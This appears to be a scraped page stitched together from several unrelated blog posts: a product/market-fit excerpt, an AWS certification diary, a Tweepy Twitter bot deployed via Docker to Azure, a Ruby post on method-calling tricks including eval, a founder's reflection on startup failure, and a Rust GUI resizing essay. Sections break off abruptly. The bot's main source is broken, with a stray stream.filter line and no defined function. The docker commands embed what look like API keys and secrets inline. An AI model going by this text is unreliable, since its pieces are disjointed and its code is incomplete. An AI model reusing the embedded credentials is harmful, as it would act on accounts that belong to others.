Reoriented around this purpose and reinvigorated by the new direction, I set out to reverse engineer a process for getting to product/market fit. Below, I outline the findings that followed, specifically unpacking the clarifying metric that made everything fall into place and the four-step process we used to build an engine that propelled Superhuman forward on the path to finding our fit.
</p>
<h5>
ANCHORING AROUND A METRIC: A LEADING INDICATOR FOR PRODUCT/MARKET FIT
</h5>
<p>
On my quest to understand product/market fit, I read all I could and spoke with every expert I could find. Everything changed when I found Sean Ellis, who ran early early growth in the early days of Dropbox, LogMeIn, and Eventbrite and later coined the term “growth hacker.”
</p>

<div>
<p>
<h4>
Start measuring your Product/Market Fit
</h4>
<h5>
<small>Built for startups. Setup in 2 minutes.</small>
</h5>
</p>

</div>

</div>
<p>
The product/market fit definitions I had found were vivid and compelling, but they were <em>lagging</em> indicators — by the time investment bankers are staking out your house, you already have product/market fit. Instead, Ellis had found a <em>leading</em> indicator: <b>just ask users “how would you feel if you could no longer use the product?” and measure the percent who answer “very disappointed.”</b>
</p>
<p>
After benchmarking nearly a hundred startups with his customer development survey, Ellis found that the magic number was 40%. Companies that struggled to find growth almost always had less than 40% of users respond “very disappointed,” whereas companies with strong traction almost always exceeded that threshold.

Tick tock.🕐</strong></p>
<p>As the clock ticks on, with a deafening silence we have never known before, like many of us, I didn't want to sit and count those seconds scrolling by.</p>
<p>Time ain't really money (I mean we should have been rich by that logic long time back) but it sure is an opportunity.</p>
<p>So, I decided to put this period of lockdown to unlock more of my potential, by diving into the clouds!</p>
<p>The World of Big Data and Cloud Services</p>
<p>By the end of this sentence, millions and billions of bytes of data would have been sent and received. And every time that happens, there are curious minds waiting to listen to what the data is saying.</p>
<p>This ever-growing avenue led to the concept of Big Data and Cloud Services, which is becoming not just a capability, but a necessity in all fields today.
Cloud is the Captain America version of Steve Rogers, basically on-premise services on steroids. </p>
<p>Like a nineties kid, I watched the big bang of bits and bytes and revolution of the internet.
The next wave is gonna be of big data and cloud services, and this time I want to be right at the centre of it rather than being a kid staring at it with jaw-dropping to the floor.</p>
<p>Becoming an AWS Ninja!</p>
<p>When I decided to jump in the world of cloud services, the first question was to go with which tech on offer?</p>
<p>Simple. I chose AWS.</p>
<h2 id="why-">Why? 🤔</h2>
<p>Well, it's like asking why Tesla is the talk of the town and not GM anymore.
Gartner's famous Magic Quadrant released in July 2019 paints a clear picture that AWS is the lead runner in race of cloud technology.
Azure and Google are definitely catching up, but so is GM and Ford for Tesla (not yet there!)</p>
<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/uw4loiyleu6n4c521l3s.png" alt="Alt Text"></p>
<p>Even if you are working towards a promotion, or churn some more dollars, AWS is the skill to have right now.</p>
<h2 id="my-journey-of-aws-certifications-">My journey of AWS Certifications 🚴‍♀️:</h2>
<h3 id="step-1-">Step 1:</h3>
<p>My baby steps on the journey to becoming a certified developer on AWS started with the AWS Cloud Practitioner certification back in November 2019.</p>
<p>So, if you are still working towards that, this article might not be for you. You can check this article out to ace the Practitioner certification.</p>
<h3 id="step-2-">Step 2:</h3>
<p>From thereon, the next thing you need to do is practice. Try to experience AWS first hand. Explore around, learn new stuff and implement what all you need.</p>
<p>For me, working in an environment where the work revolves around cloud services was a blessing as I spent good part of the last year honing my skills on the platform before feeling ready to step up the game.</p>
<p>You can also use the <a target="_blank" rel="noopener" href="https://aws.amazon.com/free/">Free Tier</a>, Amazon provides on AWS to further brush your skills before you jump into the advance stuff.</p>
<h3 id="step-3">Step 3</h3>
<p>Resources I used 📘:</p>
<p>As much as one would love to have a single source for all there is to learn, more often than not we need to club multiple sources to get the most out of them.
For AWS, <a target="_blank" rel="noopener" href="https://acloud.guru/learn/aws-certified-solutions-architect-associate">ACloud Guru's Solutions Architect Associate</a> course and another one by <a target="_blank" rel="noopener" href="https://youtu.be/Ia-UEYYR44s">Andrew Brown on freecodecamp's youtube channel</a> worked the best for me.</p>
<h3 id="step-4">Step 4</h3>
<p>One of the biggest add on for me, was to go through the FAQ's provided by AWS for service's like <a target="_blank" rel="noopener" href="https://aws.amazon.com/s3/faqs/">S3</a>, <a target="_blank" rel="noopener" href="https://aws.amazon.com/ec2/faqs/">EC2</a>, <a target="_blank" rel="noopener" href="https://aws.amazon.com/elasticloadbalancing/faqs/">Load Balancers</a>, <a target="_blank" rel="noopener" href="https://aws.amazon.com/vpc/faqs/">VPC</a>and <a target="_blank" rel="noopener" href="https://aws.amazon.com/route53/faqs/">Route53</a>.
This will help to clear all your doubts and get you better prepared for the test.</p>
<h3 id="step-5-practice-tests">Step 5: Practice Tests</h3>
<p>Nothing sets you up nicely for the real test than the practice tests.
It might be boring, but believe me, they will go a long way as a reality check for you.</p>
<p><a target="_blank" rel="noopener" href="https://www.whizlabs.com/">Whizlabs</a> provides the best tests out there at a minimal cost at $17(may have changed). The 7 practice tests are the seven steps to clearing your test.
In case you have passed the previous AWS certificate for Cloud Practitioner, you are provided with a free practice test and 50% off for the exam fee as well.</p>
<h3 id="step-6-support">Step 6: Support</h3>
<p>I would recommend to join the <a target="_blank" rel="noopener" href="https://www.freecodecamp.org/news/awscertified-challenge-free-path-aws-cloud-certifications/">#AWSCertified</a> challenge and the #100DaysOfCloud. Here is the <a target="_blank" rel="noopener" href="https://discord.gg/dvUh79v">discord for #100DaysOfCloud</a>.
I am available for any doubt clarification or any other stuff you might need.</p>
<h3 id="step-7-notes">Step 7: Notes</h3>
<p>If you just want to refresh your concepts or want to just go through concise notes before the tests, I have posted them <a target="_blank" rel="noopener" href="https://rishabkumar7.github.io/CloudNotes/">here</a> for your reference.</p>
<h3 id="step-8-the-t-day">Step 8: The T-Day</h3>
<p>Well, if you are here, it means you are ready for the test!
Just fill up for the test and in no time you will be a certified AWS Solution Architect.</p>
<p>I took around 15 days to brush up my skills, go through practice tests before I went ahead to ace my test.
It might take a little longer/shorter for you, but following these steps will certainly set you up for the test.</p>
<p>And you can follow me on <a target="_blank" rel="noopener" href="https://twitter.com/rishabk7">Twitter</a> to see my journey in the Cloud☁</p>
<p><strong>Good Luck 👍</strong></p>

<h2 id="what-is-tweepy-">What Is Tweepy 🐣?</h2>
<p>Tweepy is an open-source Python package that gives you a very convenient way to access the Twitter API with Python. Tweepy includes a set of classes and methods that represent Twitter’s models and API endpoints, and it transparently handles various implementation details, such as:
Data encoding and decoding
HTTP requests
Results pagination
OAuth authentication
Rate limits
Streams
If you weren’t using Tweepy, then you would have to deal with low-level details having to do with HTTP requests, data serialization, authentication, and rate limits. This could be time-consuming and prone to error. Instead, thanks to Tweepy, you can focus on the functionality you want to build.</p>
<h2 id="going-on-with-the-azurecertified-bot-">Going on with the #AzureCertified Bot 🤖</h2>
<p>Below is the source code for the config module. It contains create_api(), a function that reads authentication credentials from environment variables and creates the Tweepy API object:</p>
<pre><code>
<span>import</span> tweepy
<span>import</span> logging
<span>import</span> os

logger = logging.getLogger()

<span><span>def</span> <span>create_api</span><span>()</span>:</span>
    consumer_key = os.getenv(<span>"CONSUMER_KEY"</span>)
    consumer_secret = os.getenv(<span>"CONSUMER_SECRET"</span>)
    access_token = os.getenv(<span>"ACCESS_TOKEN"</span>)
    access_token_secret = os.getenv(<span>"ACCESS_TOKEN_SECRET"</span>)

    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_token, access_token_secret)
    api = tweepy.API(auth, wait_on_rate_limit=<span>True</span>, 
        wait_on_rate_limit_notify=<span>True</span>)
    <span>try</span>:
        api.verify_credentials()
    <span>except</span> Exception <span>as</span> e:
        logger.error(<span>"Error creating API"</span>, exc_info=<span>True</span>)
        <span>raise</span> e
    logger.info(<span>"API created"</span>)
    <span>return</span> api
</code></pre>
<p>This bot uses the previously introduced Tweepy stream to actively watch for tweets that contain certain keywords. For each tweet, if you’re not the tweet author, it will mark the tweet as Liked and then retweet it.</p>
<p>You can use this bot to feed your account with content that is relevant to your interests.</p>
<p>Bot Source Code</p>
<p>Below, you can see the full source code of this bot. It uses a stream to filter tweets that contain the word "#AzureCertified". Each tweet from the stream is marked as Liked and retweeted:</p>
<pre><code>


<span>import</span> tweepy
<span>import</span> logging
<span>from</span> config <span>import</span> create_api
<span>import</span> json

logging.basicConfig(level=logging.INFO)

    stream.filter(track=keywords, languages=[<span>"en"</span>])

<span>if</span> __name__ == <span>"__main__"</span>:
    main([<span>"#AzureCertified"</span>])
</code></pre>
<h2 id="building-the-docker-image-">Building the Docker Image 🐳</h2>
<p>To package your bot or application, you have to create a Dockerfile in the project’s root directory. This file contains a set of instructions used to create the Docker image containing your app.
This is how your project structure should look:</p>
<pre><code>tweepy-bots/
│
├── bots/
│   ├── config.py
│   └── favretweet.py
│
├── requirements.txt
└── Dockerfile
</code></pre><p>You can use the following Dockerfile to create the image for the Fav &amp; Retweet bot. It uses Python:3.7-alpine as the base image. We chose this image as the base since it’s very small and contains Python3.7 and pip. This Dockerfile then copies the bot code and the requirements.txt file to the image. Finally, the dependencies are installed inside the image using pip3:</p>
<pre><code>FROM python:<span>3.7</span>-alpine

COPY bots/config.py /bots/
COPY bots/favretweet.py /bots/
COPY requirements.txt /tmp
RUN pip3 install -r /tmp/requirements.txt

WORKDIR /bots
CMD [<span>"python3"</span>, <span>"favretweet.py"</span>]
</code></pre>
<p>The final line says what command must be run when this image is used.</p>
<p>Now you can build the image using this command:</p>
<p><code>$ docker build . -t fav-retweet-bot</code></p>
<p>Finally, you can use the docker run command to test the image, passing it the environment variables holding the authentication credentials:</p>
<pre><code>$ docker run -it <span>-e</span> CONSUMER_KEY=<span>"nMRNy54oWfdfssdfsV9AoNavy0I"</span> \
 <span>-e</span> CONSUMER_SECRET=<span>"olAL5VAgZLWNspsdajff757kmsPEwuxpvLCLSR08DMa4O"</span> \
 <span>-e</span> ACCESS_TOKEN=<span>"792518593-j7gWSqzQO31ju7Bfdsf7NlZeSENsuADGU9B90r"</span> \
 <span>-e</span> ACCESS_TOKEN_SECRET=<span>"fusFsxvP5IglRckJ1I1why6017xMNkzxqBID48Azw0IoT"</span> \
 fav-retweet-bot
</code></pre>
<h2 id="deploying-it-to-azure-vm">Deploying it to Azure VM</h2>
<h3 id="step-1-export-the-docker-image">Step 1: Export The Docker Image</h3>
<p>From the computer where you have created the Docker image, run these commands to export it to a file. You’re going to use this file later to upload the image to your Azure VM:</p>
<p><code>$ docker image save fav-retweet-bot:latest -o fav-retweet-bot.tar</code></p>
<h3 id="step-2-install-docker-on-your-azure-vm">Step 2: Install Docker on your Azure VM</h3>
<p>Once you’re connected, run the following commands to install Docker on the VM:</p>
<pre><code>AzureUser@TwitterBot:~$ sudo apt-get update
AzureUser@TwitterBot:~$ sudo apt install docker.io
AzureUser@TwitterBot:~$ sudo adduser ubuntu docker
</code></pre>
<h3 id="step-3-upload-your-bot-s-docker-image">Step 3: Upload Your Bot’s Docker Image</h3>
<p>From your local computer, upload the bot Docker image to your VM using scp. This can take some time depending on your internet connection:</p>
<p><code>scp fav-retweet-bot.tar AzureUser@13.196.128.199:/</code></p>
<p>Now connect to the Azure VM and load the docker image
<code>AzureUser@TwitterBot:~$ docker image load -i fav-retweet-bot.tar</code></p>
<h3 id="step-4-run-your-bot-s-docker-image">Step 4: Run Your Bot’s Docker Image</h3>
<p>The final step to deploy the bot is to run the Docker image in your Azure VM, passing it the authentication credentials.</p>
<p>You can do this using the docker command. Passing the flags -d and --restart-always assures that the bot will keep running if you disconnect from the SSH session or if the VM is restarted:</p>
<pre><code>AzureUser@TwitterBot:~$ docker run <span>-d</span> --restart always \
<span>-e</span> CONSUMER_KEY=<span>"nMRNy54oWfdfssdfsV9AoNavy0I"</span> \
 <span>-e</span> CONSUMER_SECRET=<span>"olAL5VAgZLWNspsdajff757kmsPEwuxpvLCLSR08DMa4O"</span> \
 <span>-e</span> ACCESS_TOKEN=<span>"792518593-j7gWSqzQO31ju7Bfdsf7NlZeSENsuADGU9B90r"</span> \
 <span>-e</span> ACCESS_TOKEN_SECRET=<span>"fusFsxvP5IglRckJ1I1why6017xMNkzxqBID48Azw0IoT"</span> \
 fav-retweet-bot
</code></pre>
<p>Using docker ps, you can check that the bot is running and find its container id. Finally, using the docker logs command and the container id, you can check the output from the bot to see if it works properly:</p>
<pre><code>AzureUser@TwitterBot:~$ docker logs f4aefe89a890
INFO:root:API created
INFO:root:Processing tweet id 1218244916562785538
INFO:root:Processing tweet id 1418486946762214918
</code></pre>

            <section>
                <div>
                    <p>Today during a chat with one of my colleagues we discussed agreeing on certain ways to write our Python code. We joked about how Python follows this idea of having exactly one way to do each thing (which is usually followed by the language, but not necessarily by libraries). It made me think about Ruby, which has opposite philosophy - everything can be done in many different ways.</p><p>This led me to a random idea of checking in how many different ways I can call a single method in Ruby. I ended up with 12 different ways (a couple are a bit of cheating). Prepare for some surprises below - especially the last one is mind blowing!</p><p><strong>Warning</strong> the code below is not meant for use in production (especially the last 3 examples). It is just my exploration of the language capabilities. Some of the techniques shown are useful in a bunch of cases, but make sure to proceed with caution. Simplicity, security and readability are more important than fancy stuff.</p><h2 id="setup">Setup</h2><p>For the sake of this experiment, I'm setting up a single class with one method that I'll be calling in many different ways. For the sake of simplicity, the method takes no arguments (although I believe each exaple would work with arguments as well).</p><p>The class is called <code>User</code>, it has 1 attribute, <code>name</code>, and the method to be called is <code>hello</code>, which prints a welcome message, including user name.</p><pre><code>class User
  def initialize(name)
    @name = name
  end

  def hello
    puts "Hello, #{@name}!"
  end

  def method_missing(_)
    hello
  end
end

user = User.new('Gregory')</code></pre><h2 id="1-the-obvious-way">1: the obvious way</h2><pre><code>user.hello()</code></pre><p>Not much to see here - this is how you call methods in plenty of languages. Interesting fact: you can put spaces around the dot: <code>user &nbsp;. &nbsp;hello()</code> will work as well.</p><h2 id="2-skip-the-brackets">2: skip the brackets</h2><pre><code>user.hello</code></pre><p>Technically it works the same as one before, it just skips brackets, which are optional in Ruby (as long as the code is unambiguous, sometimes they are required due multiple ways in which the code could be parsed)</p><h2 id="3-4-using-send-and-public_send">3-4: using send and public_send</h2><pre><code>user.send(:hello)
user.public_send(:hello)</code></pre><p>In this case we pass the name of the function to be called as an argument to either <code>send</code> or <code>public_send</code> methods that are defined in every class. The difference between <code>send</code> and <code>public_send</code> is that the latter respects the privacy of methods - if you try to call private method, it will raise an error, while <code>send</code> will still call it.</p><p>I'm passing the name of the function using symbol type (<code>:hello</code>), but you can use string as well &nbsp;(<code>"hello"</code>).</p><h2 id="5-7-using-method-and-call">5-7: using "method" and "call"</h2><pre><code>user.method(:hello).call
user.method(:hello).()
user.method(:hello)[]</code></pre><p>3 examples, with the 2nd and 3rd being just a syntax sugar, so I put them together. This one is quite interesting. Calling <code>user.method(:hello)</code> returns an instance of <code>Method</code> class. This object can be passed around as any value and can be called any time - it also stores the reference to the object to which it belongs, so if I change the user's name, the new one will be used:</p><pre><code>method = user.method(:hello)
user.set_instance_variable(:@name, "Not Only Code")
method.call() # prints "Hello, Not Only Code!"</code></pre><p>The <code>.()</code> and <code>[]</code> are equivalent of <code>.call()</code> and can also take arguments - <code>proc.call(1,2,3)</code>, <code>proc.(1,2,3)</code> and <code>proc[1,2,3]</code> will all work the same way (the last one won't support named arguments though).</p><h2 id="8-using-tap">8: using "tap"</h2><pre><code>user.tap(&amp;:hello)</code></pre><p><code>tap</code> is a funny little method that takes a block, passes itself as an argument there and executes the block, and then finally returns itself. I rarely use it, but there are cases where it might be helpful (like side effects when chaining methods).</p><p>The <code>&amp;:hello</code> syntax turns the <code>:hello</code> symbol into a <code>Proc</code> instance. You can read more about this syntax on <a href="https://www.honeybadger.io/blog/how-ruby-ampersand-colon-works/">Honeybadger blog</a> - it's really well explained there. <code>Proc</code> is a callable object, just like <code>Method</code> from previous examples.</p><h2 id="9-using-to_proc-on-function-name">9: using "to_proc" on function name</h2><pre><code>:hello.to_proc.call(user)</code></pre><p>I like this one because it reverses the order - <code>user</code> becomes the argument of the function. What happens under the hood here is very similar to the previous one - the <code>call</code> function of <code>Proc</code> passes the initial symbol to the argument received. Something similar to this:</p><pre><code>class Proc
  def call(obj)
    obj.send(@symbol_used_to_create_proc)
  end
end</code></pre><h2 id="10-using-method_missing">10: using "method_missing"</h2><pre><code>class User
  def method_missing(_)
    hello
  end
end

user.i_am_a_lizard_king # prints "Hello, Gregory!"
user.i_can_do_everything # prints "Hello, Gregory!"</code></pre><p>This one is a bit of cheating, since still under the hood I use the standard way of calling a method, but I think it's worth putting it here.</p><p><code>method_missing</code> is a method that will be executed when object receives a call to a method that is not defined. It's a powerful function that is one of fundaments of Ruby's flexibility, however it might lead to bugs that take ages to find (and to some perfomance issues), so use it with caution.</p><h2 id="11-using-eval">11: using "eval"</h2><pre><code>eval("user.hello")</code></pre><p>Again, a bit of cheating, since I still use the standard method call syntax, but how it works under the hood is obviously very different. <code>eval</code> passes the string to Ruby parser and interpreter just as if it was a part of my code, and then executes the code. You should definitely, absolutely avoid using it in your code, especially if you allow users to pass some values to your application.</p><h2 id="12-using-source-and-instance_eval">12: using "source" and "instance_eval"</h2><pre><code>require 'method_source' # external gem

method_source = user.method(:hello).source
method_body = method_source.split("\n")[1...-1].join(";")
user.instance_eval(method_source)</code></pre><p>Ok, the last one - and it's quite crazy, so explantion is a bit longer. It relies on external gem, called <a href="https://github.com/banister/method_source">method_source</a>, but that's because it would take me too much time and space to write this code here (it's all just Ruby though, no magic!). Let me explain how it works:</p><p><code>user.method(:hello).source</code> returns the source of the method as a string. The output of this is the whole body (including the spaces):</p><pre><code>  def hello
    puts "Hello, #{@name}!"
  end</code></pre><p>How does <code>method_source</code> gem do it? The <code>Method</code> class in Ruby has a <code>source_location</code> function that returns the location of the method's source code - file and line number where the method starts. Then <code>method_source</code> essentially opens that file, finds the respective line, looks for <code>end</code> that will end the method and returns the code in between.</p><p>Now that I have the full code of the method, I want to remove the method definition and the <code>end</code>. In my case I just remove the first and last line, but if the method was a one-liner, it would require some changes. The output of the 2nd line is a string with value: <code>puts "Hello, #{@name}!"</code> .</p><p>Finally, I take this string and I pass it to <code>instance_eval</code> of my <code>user</code> object. <code>instance_eval</code> works kind of like <code>eval</code> except that it executes code in different scope. If I call <code>eval</code> it would execute code in scope of my whole file, where the <code>@name</code> variable is not defined. By passing it to <code>instance_eval</code> I ensure it uses the correct values.</p><h2 id="is-there-more">Is there more?</h2><p>That was a fun little experiment. I'm pretty sure there are some more ways to call methods in Ruby - it's a large and very flexible language. If you know some other ways, let me know, I'm very curious!</p><p>And if you enjoy my content, check out my <a href="https://www.youtube.com/channel/UCj3PDQ-4n9sO0j3t2j608WQ">YouTube channel, Not Only Code</a>, where I'm talking about different aspects of working as a software developer.</p>

<p><em>“I feel useless. This is not our place.”</em></p>



<p>It all came out of my mouth while working with my brother.&nbsp;</p>



<p>That was a feeling we both had been sharing for long. This time I had just said it out loud.</p>



<p>After having failed twice with our previous startups, we were trying one more time.&nbsp;</p>



<p>However, having been looking for success for more than 6 years, this one looked like our last chance.</p>



<p>Little was the energy and money that remained on us. We were on the ropes.</p>



<p>Once again, we found ourselves searching for a new business idea —a problem worth solving and a viable business model.</p>



<p>We were desperately trying to come up with a new idea out of thin air. And again, we’d just hit a wall.</p>



<p>One more time, the pieces were falling down. So we were back at the starting point.&nbsp;</p>



<p>It felt like we were always running in circles.&nbsp;</p>



<p>After all the energy and effort, nothing seemed to work. We felt we’d grown a lot. We’d learned many valuable skills. Yet, nothing appeared to make a difference.</p>



<p>And as if that wasn’t enough, we felt tremendously undervalued by people in our environment.</p>



<p>It was devastating.</p>



<p><em>“We need to move forward once and for all.”&nbsp;</em>—that was the always present thought.&nbsp;</p>



<p>Nonetheless, this time we had reached a breaking point. We needed to do things differently.&nbsp;</p>



<p>Up to that point, we had always relied on the standard advice.&nbsp;</p>



<p>We followed Lean Startup and designed Lean Canvases, traction models, and all the paraphernalia.</p>



<p>We made customer discovery, interviewed people, did surveys, performed market experiments, and built MVPs.</p>



<p>We created landing pages, run Facebook Ads campaigns, and used many of the usual tools and tactics.&nbsp;</p>



<p>We tried everything.&nbsp;</p>



<p>And still, nothing worked.</p>



<p>Now, one thing was clear. We needed to find another way.&nbsp;</p>



<p>After lots of research and conversations, I’m sure this is more common than it seems.&nbsp;</p>



<p>It’s a real struggle for many. And if that’s your case, stay calm. You’re not alone.</p>



<p>Today I’m sharing what I believe was the most important lesson we learned along over ten years of hard learning to find a solution that worked for us.&nbsp;</p>



<p>We hope it will help you as well to start making progress once and for all.</p>



<h2><strong>Getting off track as soon as you start the race.</strong></h2>

<p>I jumped into my first independent startup venture more than eight years ago.</p>



<p>At that time, I’d just left Facephi, the startup I joined as CTO, just as it started its journey.&nbsp;</p>



<p>After more than four years, a pretty nice salary, a remarkable product out into the market, and 2+ million acquired in investor funding, I felt the time for a change had come.</p>



<p>I wanted to keep growing.&nbsp;</p>



<p>I was trying to run away from things I didn’t want in my life. And I desired to become happier and more fulfilled.&nbsp;</p>



<p>But my idea of what all that meant was pretty fuzzy by then.</p>



<p>So I got dragged by the status quo.</p>



<p>I got inspired by the billion-dollar tech companies.</p>



<p>I studied and applied all of the recommended tools, the popular formulas.</p>



<p>However, starting a path without knowing what I was actually seeking was a ticket for disaster.</p>



<figure><blockquote><p>Would you tell me, please, which way I ought to go from here? —said Alice.<br>That depends a good deal on where you want to get to. —said the Cat.<br>I don’t much care where. —said Alice.<br>Then it doesn’t matter which way you go. —said the Cat.</p><cite>Lewis Carrol, Alice in Wonderland.</cite></blockquote></figure>



<p>Where was I actually trying to get to? That’s the question I started asking myself following our last failure.</p>



<p>I had an intuition, but I’d never taken the time to reflect deep enough on it. I must admit that, up to that point, and to some extent, I’d looked outside for answers.</p>



<p>I needed to find the reasons why I was doing what I was doing. So, after a profound exercise of introspection and 6+ years of hustling, I found out what I was searching for.</p>



<p>In essence, I wanted to be freer to do what intrinsically moves me.&nbsp;</p>



<p>I wanted to feel useful and, what’s more important, live ethically. I felt a deep desire to do the right thing.</p>



<p>This was the purpose I expected entrepreneurship to fulfill in my life. That was what success looked like to me.</p>



<p>However, what I got was captivity. I became a slave of my business and all the different stakeholders around.</p>



<p>I had little time for what I enjoyed doing. I was dragged by meetings, external requests, recruiting, managing people, looking for funding, doing administrative tasks, putting out fires in general, and carrying out other unfulfilling stuff.</p>



<p>As a consequence, everything I did was useless. I couldn’t focus on the important, and I couldn’t deliver any meaningful progress for customers and my environment.</p>



<p>And to top it all, it affected my personal life as well.</p>



<p>I didn’t have much time for family and friends anymore. I started doing far less physical exercise, began eating and sleeping worse, and had to renounce other goals. </p>



<p>I neglected my health and wellbeing.</p>



<p>The case of my brother was no different.</p>



<p>It was evident that we’d made many unfitting calls.</p>



<h2><strong>Don’t starve looking for a solution.</strong></h2>



<p>This valuable discovery caused a radical shift in our way of thinking.</p>



<p>It was like finding a light in the middle of darkness.&nbsp;</p>



<p>Everything became pretty more clear. Without knowing where we wanted to get to, it was barely impossible to get to our right place.</p>



<p>The question is that, when everything started, I didn’t know that I didn’t know it&nbsp;<em>—</em>even though I thought I did.&nbsp;</p>



<p>It’s easy to not notice it. Society bombards you with deceptive images of success and demands you to follow them.&nbsp;</p>



<p>So I fell dragged into those fake ideals and made life-changing decisions when what I wanted for my future was still blurred in my mind.</p>



<p>Inadvertently, we were driven by others’ goals.&nbsp;</p>



<p>Till then, nothing seemed to work. But now, everything made sense. We’d just found out the crucial missing piece.</p>



<p>Yet, how could we reach the actual progress we looked for?</p>



<p>It was a strange feeling. A mix of excitement and overwhelm. We already knew what was wrong, but we had no idea about what to do.&nbsp;</p>



<p>The popularly known routes were not designed for that. We relied on a path that was not for us.</p>



<p>Was the progress we sought actually possible?&nbsp;</p>



<p>For us, we found out it was.&nbsp;</p>



<p>Could it be for you as well?</p>



<p>The short answer is, absolutely yes.</p>



<p>You can explore, try many things, and make sense of what works for you.</p>



<p>For sure, you’ll acquire many valuable lessons. But you might also run out of energy and resources before getting there.</p>



<p>Anyway, that will likely bring you through a tortuous journey, permanently driven by trial and error.&nbsp;</p>



<p>It’ll force you to go through years of pain, suffering, and effort.</p>



<p>That’s the path we had to experience.&nbsp;</p>



<p>We don’t have all the answers yet, but we’d like to make it a little easier for you. This article is just a first step.</p>



<h2><strong>See the full picture before moving forward.</strong></h2>



<blockquote><p>Put a good person in a bad system, and the bad system wins, no contest.</p><cite>W. Edwards Deming</cite></blockquote>



<p>What was the right path? How could we take the right course?</p>



<p>Well, this was not a simple question. But it was a key one we needed to make.&nbsp;</p>



<p>To get on the right track and stay there, we needed to understand first.</p>



<p>We needed to see the full picture to shape our own system before moving forward.&nbsp;</p>



<p>This time we did not focus on how to develop a high-growth business. Instead, we made it all about growing ourselves successfully as creators.&nbsp;</p>



<p>We turned our approach inside out and pressed a key that would change the rules of the game forever.</p>



<p>However, to do so, we needed to go back to the foundations. We needed to identify and comprehend the crucial factors that could help us make the right choices.</p>



<h2><strong>The exit is inward.</strong>..</h2>



<blockquote><p>The least obvious part of the system, its function or purpose, is often the most crucial determinant of the system’s behavior.</p><cite><em>Daniella Meadows, Thinking in Systems</em></cite></blockquote>



<p>A broadly expansive vision around creation exists.&nbsp;</p>



<p>It tells us the purpose of business is to make money, to get recognized, and to scale up the socio-economic ladder.</p>



<p>We might not fully buy-in that vision, but even then, many times, the social and structural environment will push us towards it.&nbsp;</p>



<p>We’ve grown inside it. We operate in it. We are surrounded by it. It’s everywhere.</p>



<p>It steeps the system we live in. So we’ve got no choice. It’s easy to fall into it without even noticing.</p>



<p>When we start a creative career on our own, we usually look outside for answers. What’re other people doing? Who seems to be doing fine?</p>



<p>We habitually find messages, references and models precisely aligned around that broken vision.</p>



<p>We don’t take the time to understand what we’re looking for first, so it’s easy to get dragged by the current and start making unfitting choices.</p>



<p>But the thing is that this is a dangerous trap to fall into.&nbsp;</p>



<p>As you get further into the current, it gets increasingly difficult to get out of the inertia. You just want to prove yourself right, so you keep repeating the same mistakes once and again, only to make things even worse.</p>



<p>That’s what happened to me.</p>



<p>No one is safe from the misleading external influence. And I was no exception.</p>



<p>But the answer was inside me.&nbsp;</p>



<p>Why all the effort? To the outside, it made no sense.</p>



<p>But now, one thing was neat, whatever the new system we followed, it should be aimed at delivering on what we intrinsically value.&nbsp;</p>



<p>It should be meant to get more freedom to explore, learn, and create on our own terms.&nbsp;</p>



<p>It should be aimed at getting more room to pursue other goals and grow in other areas of our lives.</p>



<p>And it should be targeted at contributing to this world, for good.</p>



<p>Did I actually need to build a macro-business overnight for that? Obviously not. There was a more sustainable path.</p>

  <div itemprop="articleBody">
    <p>When I was young, as we traveled my dad had a quick test for the quality of a Chinese restaurant: if the tea wasn’t good, chances were the food wouldn’t be great either. One time, we left before ordering, and I don’t think we missed out on much.</p>

<p>Today is an exciting point in the evolution of native GUI in Rust. There is much exploration, and a number of promising projects, but I also think we don’t yet know the recipe to make GUI truly great. As I develop my own vision in this space, <a href="https://github.com/xi-editor/druid">druid</a>, I hope more that the efforts will learn from each other and that an excellent synthesis will emerge, more so than simply hoping that druid will win.</p>

<p>In my work, I have come across a problem that is as seemingly simple, yet as difficult to get right, as making decent tea: handling smooth window resizing. Very few GUI toolkits get it perfect, with some failing spectacularly. This is true across platforms, though Windows poses special challenges. It’s also pretty easy to test (as opposed to requiring sophisticated latency measurements, which I also plan to develop). I suggest it become one of the basic tests to evaluate a GUI toolkit.</p>

<p>To apply the test, open an app built in your favorite GUI toolkit, and grab the <em>left</em> edge of the window. Drag it back and forth, and check to see whether the right edge of the app is stable, especially if it has scrollbars.</p>

<p>Why this particular test? Among other things, it’s at the confluence of a number of subsystems, including interfaces with the underlying desktop OS. It also exposes some fundamental architectural decisions, especially regarding asynchrony.</p>

<p>The smooth resizing test also exposes issues at multiple layers – the staging of layout vs drawing within the GUI toolkit, whether requests from the platform can be handled synchronously, and complex interactions between graphics and window management in the platform itself, which the app <em>may</em> be able to control to at least some extent. I’ll go through these from low level to high level.</p>

<h2 id="synchronization-with-window-manager">Synchronization with window manager</h2>

<p>Resizing a window kicks off two cascades of actions, which are at risk of getting desynchronized. One is the window frame, and the other is the window contents, custom-drawn for the size of the window.</p>

<p>This is what it looks like when it goes wrong. It’s a lightly adapted version of the “Hello Triangle” example from Apple.</p>

<p><img src="https://raphlinus.github.io/assets/wobbly_hello_triangle.gif" alt="wobbly red triangle"></p>

<p>The fundamental problem here is that the 3D graphics pipeline is essentially asynchronous. Requests go in, get rendered by the GPU, then actually presented on the screen at some later time. For ordinary game-like content when you’re not resizing, this is fine, and the asynchronous approach has performance advantages, in particular it lets you do work on the CPU and GPU at the same time. But without some explicit synchronization, you get wobbling as above.</p>

<p>Many people have struggled with this issue, both on macOS and Windows. For example, iTerm2 switches to software rendering while resizing, for this reason. Fortunately, Tristan Hume has recently figured out a recipe to make it work, which you can read in the <a href="http://thume.ca/2019/06/19/glitchless-metal-window-resizing/">glitchless Metal window resizing</a> blog post. The key insight is to use <code>CAMetalLayer</code> instead of <code>MTKView</code>, and set <code>presentsWithTransaction</code>.</p>

<p>Windows has a similar issue; with newer <a href="https://docs.microsoft.com/en-us/windows/desktop/direct3ddxgi/for-best-performance--use-dxgi-flip-model">flip model</a> presentation modes optimized for performance, the content goes out of sync with the window drawing. Older presentation modes (which copy the full window contents to a “redirection buffer”) are synchronized, so not all UI toolkits are affected. It’s mostly an issue when the toolkit is also trying to optimize performance, especially latency, for which there are mechanisms such as wait objects that only work with the flip model.</p>

